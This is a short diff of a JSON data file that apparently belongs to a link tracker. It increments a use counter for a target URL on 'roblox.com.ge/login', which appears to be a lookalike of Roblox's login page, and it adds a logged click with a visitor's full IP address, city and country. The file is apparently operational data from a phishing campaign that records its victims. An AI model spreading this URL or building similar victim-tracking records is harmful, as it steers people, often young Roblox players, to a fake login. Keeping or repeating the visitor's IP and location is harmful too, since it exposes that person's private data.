@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1275,
+    "useCount": 1276,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10344,6 +10344,14 @@
         "city": "Malé",
         "flag": "🇲🇻",
         "countryCode": "MV"
+      },
+      {
+        "timestamp": 1777365603972,
+        "ip": "49.146.40.218",
+        "country": "Philippines",
+        "city": "Cagayan de Oro",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
